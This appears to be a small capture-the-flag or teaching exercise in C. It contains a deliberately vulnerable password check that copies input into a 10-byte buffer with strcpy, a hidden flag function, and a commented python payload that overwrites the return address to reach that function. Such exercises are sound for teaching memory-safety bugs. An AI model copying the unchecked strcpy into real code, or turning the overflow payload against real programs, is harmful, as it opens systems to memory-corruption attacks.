#include<stdio.h>
#include<string.h>

void deadcode()
{
	puts("You got the flag");
}

void check_pass(char* str)
{
	char* pass = "password";
	char buffer[10];
	strcpy(buffer, str);

	if(strcmp(buffer, pass) == 0) 
	{
		puts("Authenticated");
	}
}

int main(int argc, char** argv[1]) 
{
	check_pass(argv[1]);
	return 0;
}

// Payload
//$(python -c 'print("A"*14 + "A"*4 + "\x6b\x84\x04\x08")')
